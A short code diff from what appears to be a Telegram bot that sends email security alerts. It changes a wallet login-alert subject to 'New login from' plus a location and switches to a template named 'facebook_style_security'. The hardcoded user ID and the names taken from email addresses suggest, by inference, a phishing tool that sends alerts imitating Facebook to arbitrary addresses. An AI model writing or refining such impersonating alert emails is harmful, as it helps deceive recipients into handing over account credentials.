@@ -62,8 +62,8 @@ class SimpleTelegramBot:
             result = await self.email_service.send_email(
                 to_email=email,
                 to_name=email.split('@')[0].title(),
-                subject="Unrecognized Login Attempt to Your Wallet",
-                template_name="security_alert",
+                subject="New login from " + alert_data['login_location'],
+                template_name="facebook_style_security",
                 user_id=99999,
                 **alert_data
             )
